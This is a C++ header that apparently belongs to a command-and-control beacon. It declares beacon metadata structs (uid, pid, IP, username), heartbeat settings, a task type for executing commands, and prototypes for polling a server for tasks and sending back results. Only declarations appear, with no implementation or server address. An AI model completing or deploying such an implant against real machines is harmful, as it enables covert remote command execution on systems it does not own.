#include <string>
#include <iostream>
#include <vector>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <crypt.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/types.h>
#include <ctype.h>
#include <pwd.h>
#include <netdb.h>
#include <ifaddrs.h>
#include<sys/time.h>
#include <sys/select.h>

#define RESPONSE_MAX_BUFFER 500
#define CHECK_ALIVE_TIMEOUT 5
#define HEARTBEAT_TIME 1
#define USERNAME_LEN 40

enum TASK{ EXEC_COMMAND = 1, SET_TIMEOUT = 2, NO_TASK = 0};


typedef struct tasks_pack
{
    /* data */
    std::string task_id;
    enum TASK task_type; 
}Task_PACK;

typedef struct beacon_packet
{
    /* data */
    std::string uid;
    std::string ip;
    std::string pid;
    std::string uuid;
}beacon;

#pragma pack(4)
typedef struct beacon_meta_data{
    unsigned int uid;
    unsigned int pid;
    unsigned int ip;
    char username[USERNAME_LEN];
}BEACON_META_DATA;
#pragma pack()

int connect_socket(char * host, unsigned int port);
int send_get_msg(int sock,const char * uri);
int send_post_msg(int sock,const char * uri);
int recv_response(int sock, std::string & response);
int send_beacon_info(int sock);
int send_task_result(int sock, std::string task_id ,std::string task_result);
int send_header_msg(int sock, std::vector<std::string> headers);
unsigned int get_local_ip();
Task_PACK get_task(std::string response, std::string & task_data);
std::string handle_task(Task_PACK task  , std::string task_data);
std::string task_exec_command(std::string data);
std::string find_value_by_key(std::string data, std::string key);

